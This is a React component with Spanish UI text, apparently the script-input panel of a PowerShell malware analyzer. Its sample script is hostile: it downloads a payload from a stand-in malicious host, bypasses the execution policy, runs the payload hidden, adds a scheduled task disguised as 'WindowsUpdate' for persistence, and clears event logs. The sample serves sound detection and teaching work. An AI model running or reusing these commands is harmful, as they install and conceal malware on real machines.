import React, { useState } from 'react';
import { Upload, Play, FileText, AlertCircle, Info } from 'lucide-react';

const ScriptInput = ({ onAnalyze, isLoading }) => {
  const [script, setScript] = useState('');
  const [dragOver, setDragOver] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (script.trim()) {
      onAnalyze(script);
    }
  };

  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (file && file.type === 'text/plain' || file.name.endsWith('.ps1')) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setScript(e.target.result);
      };
      reader.readAsText(file);
    }
  };

  const handleDrop = (e) => {
    e.preventDefault();
    setDragOver(false);
    
    const file = e.dataTransfer.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setScript(e.target.result);
      };
      reader.readAsText(file);
    }
  };

  const handleDragOver = (e) => {
    e.preventDefault();
    setDragOver(true);
  };

  const handleDragLeave = (e) => {
    e.preventDefault();
    setDragOver(false);
  };

  const loadSampleScript = () => {
    const sampleScript = `# Ejemplo de script sospechoso
$url = "http://malicious-site.com/payload.exe"
$path = "$env:TEMP\\malware.exe"

# Descargar payload
Invoke-WebRequest -Uri $url -OutFile $path

# Bypass de ejecución
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Ejecutar con ventana oculta
Start-Process -FilePath $path -WindowStyle Hidden

# Crear persistencia
$taskName = "WindowsUpdate"
$action = New-ScheduledTaskAction -Execute $path
Register-ScheduledTask -TaskName $taskName -Action $action

# Limpiar logs
Clear-EventLog -LogName Application`;
    
    setScript(sampleScript);
  };

  return (
    <div className="bg-white rounded-lg shadow-sm border p-6">
      <div className="flex items-center space-x-2 mb-4">
        <FileText className="w-5 h-5 text-blue-600" />
        <h2 className="text-lg font-semibold text-gray-900">
          Script PowerShell
        </h2>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Textarea con drag and drop */}
        <div
          className={`relative border-2 border-dashed rounded-lg transition-colors ${
            dragOver 
              ? 'border-blue-400 bg-blue-50' 
              : 'border-gray-300 hover:border-gray-400'
          }`}
          onDrop={handleDrop}
          onDragOver={handleDragOver}
          onDragLeave={handleDragLeave}
        >
          <textarea
            value={script}
            onChange={(e) => setScript(e.target.value)}
            placeholder="Pega tu script PowerShell aquí o arrastra un archivo .ps1..."
            className="w-full h-64 p-4 border-0 resize-none focus:ring-0 rounded-lg font-mono text-sm"
            disabled={isLoading}
          />
          
          {dragOver && (
            <div className="absolute inset-0 flex items-center justify-center bg-blue-50 bg-opacity-90 rounded-lg">
              <div className="text-center">
                <Upload className="w-8 h-8 text-blue-600 mx-auto mb-2" />
                <p className="text-blue-600 font-medium">Suelta el archivo aquí</p>
              </div>
            </div>
          )}
        </div>

        {/* Controles de archivo */}
        <div className="flex flex-wrap gap-2">
          <label className="inline-flex items-center px-3 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 cursor-pointer">
            <Upload className="w-4 h-4 mr-2" />
            Cargar archivo
            <input
              type="file"
              accept=".ps1,.txt"
              onChange={handleFileUpload}
              className="hidden"
              disabled={isLoading}
            />
          </label>
          
          <button
            type="button"
            onClick={loadSampleScript}
            className="inline-flex items-center px-3 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
            disabled={isLoading}
          >
            <FileText className="w-4 h-4 mr-2" />
            Script de ejemplo
          </button>
        </div>

        {/* Información */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
          <div className="flex items-start space-x-2">
            <Info className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
            <div className="text-sm text-blue-800">
              <p className="font-medium mb-1">Información de seguridad:</p>
              <ul className="space-y-1 text-blue-700">
                <li>• Los scripts se analizan localmente</li>
                <li>• Compatible con archivos .ps1 y texto plano</li>
                <li>• El análisis incluye más de 50 patrones maliciosos</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Estadísticas del script */}
        {script.trim() && (
          <div className="bg-gray-50 rounded-lg p-3">
            <div className="grid grid-cols-3 gap-4 text-center">
              <div>
                <div className="text-lg font-semibold text-gray-900">
                  {script.length}
                </div>
                <div className="text-xs text-gray-500">Caracteres</div>
              </div>
              <div>
                <div className="text-lg font-semibold text-gray-900">
                  {script.split('\n').length}
                </div>
                <div className="text-xs text-gray-500">Líneas</div>
              </div>
              <div>
                <div className="text-lg font-semibold text-gray-900">
                  {script.split(/\s+/).filter(word => word.length > 0).length}
                </div>
                <div className="text-xs text-gray-500">Palabras</div>
              </div>
            </div>
          </div>
        )}

        {/* Botón de análisis */}
        <button
          type="submit"
          disabled={!script.trim() || isLoading}
          className="w-full flex items-center justify-center px-4 py-3 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isLoading ? (
            <>
              <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
              Analizando...
            </>
          ) : (
            <>
              <Play className="w-4 h-4 mr-2" />
              Analizar Script
            </>
          )}
        </button>
      </form>

      {/* Advertencia de seguridad */}
      <div className="mt-4 bg-yellow-50 border border-yellow-200 rounded-lg p-3">
        <div className="flex items-start space-x-2">
          <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" />
          <div className="text-sm text-yellow-800">
            <p className="font-medium">Advertencia:</p>
            <p>Nunca ejecutes scripts sospechosos en sistemas de producción. Este analizador es solo para fines de investigación y educación.</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ScriptInput;